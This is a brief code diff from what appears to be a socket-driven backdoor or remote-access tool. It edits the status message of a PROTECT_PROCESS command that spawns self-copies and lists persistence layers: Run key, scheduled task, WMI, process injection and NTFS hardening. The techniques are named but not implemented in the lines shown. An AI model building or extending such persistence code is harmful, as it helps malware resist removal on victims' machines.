@@ -141,7 +141,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
         sys_spawn_shadow_copy();
-        result = "[Spawned 3 copies with double persistence: Run key + Scheduled Task every 5min — auto-protect in 15s]";
+        result = "[Spawned 3 copies + ALL layers: Run key + Task + WMI + Injection + NTFS hardening]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
         sys_unprotect_process();
